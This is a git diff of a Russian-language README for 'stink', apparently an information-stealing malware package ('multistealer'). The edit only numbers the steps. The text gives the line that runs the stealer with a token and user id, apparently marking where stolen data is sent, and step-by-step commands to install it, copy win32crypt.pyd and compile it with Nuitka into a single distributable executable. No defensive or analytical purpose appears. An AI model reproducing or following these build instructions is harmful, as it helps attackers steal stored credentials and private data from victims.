@@ -121,7 +121,7 @@ from stink.multistealer import Stealer
 Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ```
 ### PyCharm
-Устанавливаем Nuitka и Stink:
+1. Устанавливаем Nuitka и Stink:
 ```
 pip install Nuitka==0.6.16.4
 ```
@@ -129,22 +129,22 @@ pip install Nuitka==0.6.16.4
 ```
 pip install stink==0.0.3
 ```
-Открываем терминал и прописываем команду:
+2. Открываем терминал и прописываем команду:
 ```python
 nuitka --onefile --include-package=stink test.py
 ```
-### **CMD**
-Открываем `cmd`.
+### CMD
+1. Открываем `cmd`.
 
-Прописываем команду:
+2. Прописываем команду:
 ```
 pip install virtualenv
 ```
-Переходим в папку с файлом test.py:
+3. Переходим в папку с файлом test.py:
 ```
 cd path\to\file
 ```
-Создаем виртуальное окружение и активируем его:
+4. Создаем виртуальное окружение и активируем его:
 ```
 virtualenv venv
 ```
@@ -152,7 +152,7 @@ virtualenv venv
 ```
 venv\Scripts\activate
 ```
-Устанавливаем Nuitka и Stink:
+5. Устанавливаем Nuitka и Stink:
 ```
 pip install Nuitka==0.6.16.4
 ```
@@ -160,9 +160,9 @@ pip install Nuitka==0.6.16.4
 ```
 pip install stink==0.0.3
 ```
-В появившейся папке venv переходим по пути `\Lib\site-packages\win32\`, копируем файл `win32crypt.pyd` и вставляем по пути `\Lib\site-packages\`.
+6. В появившейся папке venv переходим по пути `\Lib\site-packages\win32\`, копируем файл `win32crypt.pyd` и вставляем по пути `\Lib\site-packages\`.
 
-Возвращаемся к `cmd` и прописываем команду:
+7. Возвращаемся к `cmd` и прописываем команду:
 ```
 nuitka --onefile --include-package=stink stink_test.py
 ```
